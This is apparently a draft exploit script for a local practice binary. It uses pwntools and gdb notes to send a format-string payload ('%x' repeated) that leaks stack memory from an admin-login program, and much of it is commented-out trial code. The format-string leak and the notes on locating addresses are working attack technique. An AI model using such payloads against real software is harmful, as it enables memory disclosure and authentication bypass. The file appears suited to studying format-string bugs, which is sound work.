#!/usr/bin/python

"""
STEPS:
1) Find the ret address of the `authenticate_admin` function
    gdb build/format_string_debug
    (gdb) b *(&authenticate_admin)
    (gdb) r
    (gdb) i r $rsp
        rsp            0x7fffffffd758      0x7fffffffd758
    (gdb) x/10i $rsp
2) Find the address of the `entered_name` array
    (gdb) p &entered_name[0]
        $1 = 0x7fffffffd6c0 ""
"""

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = 'build/format_string_debug'

authenticate_admin_ret_addr = 0x7fffffffd758
entered_name_addr = 0x7fffffffd6c0

# binary = ELF(binary_path)
# admin_panel_addr = binary.symbols['admin_panel']

# retq_asm = asm('retq')
# retq_addr = binary.search(retq_asm).next()

p = process(binary_path)
#p = gdb.debug([binary_path])

p.recvline('Enter username:')
payload = b'admin'
payload += b'%x'*10


# Send the payload to the vulnerable program
p.sendline(payload)
p.recvline('Enter password:')
#payload += b'%120$s'

payload = 'aaaaaaaa'
p.sendline(payload)
log.info(f"Received stack content: {p.clean()}")
# p.recvline()
# p.recvline()
#log.info(p.recvall().decode('ascii', errors='ignore'))
#log.info(f"Received stack content: {b''.join([hex(i) for i in p.clean()])}")
# Receive and print the response
#response = p.recvall()
#print("Received stack content:", response)

# try:
#     while True:
#         output = p.recv(timeout=1)
#         if not output:
#             break  # No more data received
#         print(output.decode('utf-8', errors='ignore'), end='')
# finally:
#     p.close()


p.close()
#p.interactive()

# # Wait for the prompt "Enter username"
# #p.recvuntil("Enter username:")
# print(p.clean().decode('latin-1'))

# # Send payload to the program
# p.sendline(payload)
# p.interactive()
# # Receive response from the program
# response = p.recvall()

# # Print the leaked memory content
# print("Leaked memory content: ", response.decode())

# # Close the connection
#p.close()
# p.interactive()
